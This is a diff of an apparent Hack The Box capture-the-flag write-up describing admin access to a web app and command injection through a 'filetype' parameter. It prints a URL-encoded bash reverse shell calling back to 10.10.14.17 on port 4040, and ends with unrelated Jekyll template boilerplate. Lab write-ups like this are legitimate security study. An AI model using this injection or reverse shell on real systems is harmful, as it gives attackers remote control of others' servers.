@@ -51,7 +51,7 @@ How we can see the `port 80` is open so we are going to the domain [**https://ph
 
 ---
 
-## Enumeration
+### Enumeration
 
 Seeying the web-page index we have to click on `click here!` and it'll appear that credentials panel
 
@@ -78,15 +78,15 @@ Soo.. we are admin **('-')**
 In that step we are using a proxy tool called [**Burpsuite**] and let's start to test.
 
 ### Proxy
-So in this panel tell us that we are unable to download any picture from this page, well with the help our proxy we can see what request leave it us
+So in this panel tell us that we are unable to download any picture from this page, well with the help our proxy we can see what request leave it us:
 
+How we can see the request
 ![HTB Img](/assets/img//HTB/EASY/request.png)
 
-so with that, send it to repeater for start to test 
 
 ![HTB Img](/assets/img//HTB/EASY/repeater.png)
 
-verify the response with a 500 code **Internal Server Error** we are going to test if it works to do a [**reverse shell**], on filetype parameter we are put to next to `jpg` adding `;` and write the next reverse shell *(PD: encoded on url because we'll have an error from the syntaxis)* on my case I'll use from *bash* method with **Netcat** listener
+verify the response with a **500 code** **[Internal Server Error]** we are going to test if it works to do a [**reverse shell**], on filetype parameter we are put to next to `jpg` adding `;` and write the next reverse shell *(PD: encoded on url because we'll have an error from the syntaxis)* on my case I'll use from *bash* method with **Netcat** listener
 
 ```console
 bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
@@ -94,6 +94,8 @@ bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
 ```
 > You can see others methods from this [**web**](https://sentrywhale.com/documentation/reverse-shell) :D.
 {: .prompt-tip }
+
+
 
 Create a new file named `YYYY-MM-DD-TITLE.EXTENSION`{: .filepath} and put it in the `_posts`{: .filepath} of the root directory. Please note that the `EXTENSION`{: .filepath} must be one of `md`{: .filepath} and `markdown`{: .filepath}. If you want to save time of creating files, please consider using the plugin `Jekyll-Compose`(https://github.com/jekyll/jekyll-compose) to accomplish this.
 
